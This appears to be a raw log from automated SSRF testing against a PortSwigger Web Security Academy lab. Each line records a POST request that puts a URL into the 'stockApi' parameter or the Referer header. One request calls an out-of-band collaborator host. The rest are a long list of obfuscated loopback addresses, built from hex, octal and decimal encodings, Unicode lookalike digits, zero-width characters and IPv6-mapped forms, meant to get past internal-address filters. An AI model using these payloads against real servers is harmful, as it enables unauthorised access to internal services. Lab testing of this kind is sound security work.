[2025-03-26T07:24:09.749247] method=POST param='stockApi' → https://	bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:38:57.660778] method=POST param='header: referer' → https://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:58.037084] method=POST param='header: referer' → https://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:58.403397] method=POST param='header: referer' → https://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:58.771312] method=POST param='header: referer' → https://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:59.148475] method=POST param='header: referer' → https://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:59.542769] method=POST param='header: referer' → https://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:59.932938] method=POST param='header: referer' → https://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:00.311045] method=POST param='header: referer' → https://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:00.635294] method=POST param='header: referer' → https://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:01.001835] method=POST param='header: referer' → https://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:01.412211] method=POST param='header: referer' → https://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:01.734821] method=POST param='header: referer' → https://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:02.143303] method=POST param='header: referer' → https://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:02.489212] method=POST param='header: referer' → https://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:02.866907] method=POST param='header: referer' → https://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:03.201871] method=POST param='header: referer' → https://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:03.585631] method=POST param='header: referer' → https://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:03.964296] method=POST param='header: referer' → https://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:04.362387] method=POST param='header: referer' → https://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:04.734546] method=POST param='header: referer' → https://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:05.059858] method=POST param='header: referer' → https://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:05.383607] method=POST param='header: referer' → https://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:05.772218] method=POST param='header: referer' → https://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:06.116768] method=POST param='header: referer' → https://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:06.485044] method=POST param='header: referer' → https://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:06.810456] method=POST param='header: referer' → https://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:07.145025] method=POST param='header: referer' → https://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:07.484361] method=POST param='header: referer' → https://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:07.839190] method=POST param='header: referer' → https://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:08.211776] method=POST param='header: referer' → https://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:08.582115] method=POST param='header: referer' → https://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:08.964381] method=POST param='header: referer' → https://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:09.352488] method=POST param='header: referer' → https://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:09.721139] method=POST param='header: referer' → https://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:10.095865] method=POST param='header: referer' → https://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:10.464786] method=POST param='header: referer' → https://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:10.848709] method=POST param='header: referer' → https://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:11.223708] method=POST param='header: referer' → http://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:11.584914] method=POST param='header: referer' → http://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:11.980677] method=POST param='header: referer' → http://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:12.349122] method=POST param='header: referer' → http://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:12.714600] method=POST param='header: referer' → http://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:13.038611] method=POST param='header: referer' → http://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:13.432385] method=POST param='header: referer' → http://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:13.775556] method=POST param='header: referer' → http://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:14.152665] method=POST param='header: referer' → http://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:14.476518] method=POST param='header: referer' → http://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:14.839362] method=POST param='header: referer' → http://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:15.217261] method=POST param='header: referer' → http://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:15.587821] method=POST param='header: referer' → http://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:15.910429] method=POST param='header: referer' → http://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:16.282298] method=POST param='header: referer' → http://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:16.647191] method=POST param='header: referer' → http://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:16.975744] method=POST param='header: referer' → http://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:17.297905] method=POST param='header: referer' → http://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:17.691434] method=POST param='header: referer' → http://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:18.017219] method=POST param='header: referer' → http://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:18.345736] method=POST param='header: referer' → http://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:18.670525] method=POST param='header: referer' → http://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:19.061443] method=POST param='header: referer' → http://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:19.436313] method=POST param='header: referer' → http://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:19.805095] method=POST param='header: referer' → http://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:20.187911] method=POST param='header: referer' → http://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:20.552422] method=POST param='header: referer' → http://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:20.931577] method=POST param='header: referer' → http://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:21.320002] method=POST param='header: referer' → http://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:21.645312] method=POST param='header: referer' → http://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:22.009548] method=POST param='header: referer' → http://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:22.376711] method=POST param='header: referer' → http://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:39:22.743331] method=POST param='header: referer' → http://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
